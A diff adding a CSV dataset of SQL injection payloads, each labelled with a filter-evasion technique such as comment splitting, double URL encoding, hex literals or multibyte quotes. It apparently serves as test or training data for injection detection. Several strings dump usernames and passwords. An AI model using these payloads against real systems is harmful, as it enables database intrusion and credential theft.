@@ -1,0 +1,53 @@
+text,technique
+"' /*!50000UNION*/ SELECT username,password FROM users -- ",inline-comment
+"' /*!50000SELECT*/ 1,2,3 -- ",inline-comment
+"' /*!or*/ /*!1=1*/ -- ",inline-comment-lower
+"' OR/*!1=1*/-- ",mysql-versioned-comment
+"' /*!32302 UNION */ SELECT 1,2 -- ",mysql-versioned-comment
+"' UnIoN sElEcT username,password FROM users -- ",case-mixing
+"' SeLeCt @@VeRsIoN -- ",case-mixing
+"'; SeLeCt SlEeP(5)-- ",case-mixing-stacked
+"' oR/**/1=1/**/oR/**/''='",case-mix-and-comment
+"%2527%2520OR%25201%253D1",double-url-encode
+"%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554",double-url-encode
+"%252f%252a%252a%252f OR %252f%252a%252a%252f 1=1",double-url-encode
+"%27%20OR%20%271%27%3D%271",url-encode-basic
+"%27%29%20OR%20%281%3D1%20--%20",url-encode-paren
+"' or%20true%23",url-encode-space
+"' OR 1=1 %2d%2d ",url-encode-comment
+"' OR 0x31=0x31 -- ",hex-literal
+"' UNION SELECT 0x61646d696e,0x70617373 -- ",hex-literal
+"' OR 0x4f52=0x4f52 -- ",hex-literal
+"' AND CAST(0x28 AS CHAR) OR 1=1 -- ",hex-cast
+"' OR CHAR(49)=CHAR(49) -- ",char-function
+"' UNION SELECT CHAR(117,115,101,114),CHAR(112,97,115,115) -- ",char-function
+"' OR CHR(65)||CHR(66)=CHR(65)||CHR(66) -- ",char-function
+"' UNION SELECT unhex('61'),2 -- ",unhex-function
+"' OR ASCII(97)=97 -- ",ascii-function
+"'/**/OR/**/1=1/**/-- ",whitespace-comment
+"'/**/UNION/**/SELECT/**/1,2,3/**/-- ",whitespace-comment
+"'%09OR%091=1%09-- ",whitespace-as-tab
+"'%0aOR%0a1=1%0a-- ",whitespace-as-newline
+"'+OR+1=1--+",whitespace-as-plus
+"' UNI/**/ON SEL/**/ECT 1,2 -- ",split-keyword
+"' UN/**/ION/**/ALL/**/SE/**/LECT NULL,NULL -- ",split-keyword
+"' UniOn(SelEct(1),version(),(3)) -- ",no-space-parens
+"'UNION(SELECT(username),(password)FROM(users))-- ",no-space-parens
+"'||(SELECT '')||'",string-concat-oracle
+"' OR 'a'||'b'='ab' -- ",string-concat
+"' OR 'a'+'b'='ab' -- ",string-concat-mssql
+"0e0 OR 1=1 -- ",scientific-notation
+"' OR 1.0=1.0 -- ",float-literal
+"' OR 1 BETWEEN 0 AND 2 -- ",between-operator
+"' OR 1 LIKE 1 -- ",like-operator
+"' OR 1 IN (1,2,3) -- ",in-operator
+"' OR 1 REGEXP 1 -- ",regexp-operator
+"' OR 1 RLIKE 1 -- ",rlike-operator
+"' OR NOT 1=2 -- ",not-operator
+"' OR 1=1#",hash-comment
+"'-- -",dash-dash-dash-comment
+"';%00",null-byte
+"' OR 1=1;%00",null-byte
+"%c0%27 OR 1=1 -- ",overlong-utf8-quote
+"%bf%27 OR 1=1 -- ",gbk-multibyte-quote
+"' OR 'x'=N'x' -- ",unicode-string-prefix
